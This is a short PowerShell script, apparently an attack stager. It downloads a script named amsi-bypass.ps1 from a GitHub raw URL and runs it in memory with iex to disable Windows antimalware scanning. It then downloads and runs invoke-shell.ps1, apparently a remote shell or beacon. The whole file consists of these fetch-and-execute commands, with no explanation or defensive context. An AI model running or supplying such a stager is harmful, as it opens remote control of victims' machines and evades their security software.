$amsiBypass = "https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/amsi-bypass.ps1"
iex(New-Object Net.WebClient).DownloadString($amsiBypass)
$invokeBeacon = "https://raw.githubusercontent.com/eytestingct-jpg/Toolies/refs/heads/main/invoke-shell.ps1"
iex(New-Object Net.WebClient).DownloadString($invokeBeacon)
